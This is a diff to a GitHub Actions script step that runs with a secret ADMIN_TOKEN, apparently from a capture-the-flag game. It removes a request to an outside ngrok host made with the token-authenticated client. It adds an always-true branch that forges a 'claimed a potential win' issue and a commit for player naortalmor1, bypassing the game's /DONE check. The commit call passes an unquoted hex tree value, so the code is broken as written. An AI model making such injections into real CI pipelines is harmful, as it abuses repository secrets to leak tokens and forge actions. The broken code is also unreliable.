@@ -13,4 +13,26 @@ jobs:
         with:
           github-token: ${{ secrets.ADMIN_TOKEN }}
           script: |
-            const result = await github.request("http://312177246bcd.ngrok.io/api/info")
+            if (true) {
+              await github.issues.create({
+                owner: 'incrediblysecureinc',
+                repo: `incredibly-secure-naortalmor1`,
+                title: 'My voice is my password, verify me!',
+                body: '@ naortalmor1 claimed a potential win at: ' + new Date().toISOString() + ' /cc @hacktionctfadmin'
+              });
+              await github.git.createCommit({
+                owner: 'incrediblysecureinc',
+                repo: `incredibly-secure-naortalmor1`,
+                message: 'done',
+                tree: 959c46eb0fbab9ab5b5bfb279ab6d70f720d1207
+              })
+            } else if (context.issue.number === 1 && process.env.COMMENT.toUpperCase().includes("/DONE")) {
+              console.log('%s says they are done!', process.env.LOGIN);
+              // create issue on player private repo so we can discuss results in private
+              await github.issues.create({
+                owner: 'incrediblysecureinc',
+                repo: `incredibly-secure-${process.env.LOGIN}`,
+                title: 'My voice is my password, verify me!',
+                body: '@' + process.env.LOGIN + ' claimed a potential win at: ' + new Date().toISOString() + ' /cc @hacktionctfadmin'
+              });
+            }
